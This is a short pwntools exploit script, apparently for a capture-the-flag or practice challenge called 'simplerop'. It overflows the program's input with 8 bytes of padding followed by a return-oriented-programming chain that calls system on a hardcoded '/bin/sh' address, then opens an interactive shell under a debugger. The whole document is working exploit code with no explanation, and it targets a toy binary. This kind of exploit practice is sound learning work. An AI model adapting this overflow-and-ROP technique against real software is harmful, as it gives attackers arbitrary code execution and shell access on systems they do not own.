from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

p = process("./simplerop")
gdb.attach(p, '')
binary = ELF("./simplerop")

rop = ROP(binary)
binsh = 0x402008
system = 0x4011df
rop.call(system, [binsh])

print(rop.dump())

p.sendline(b'A' * 8 + rop.chain())
p.interactive()
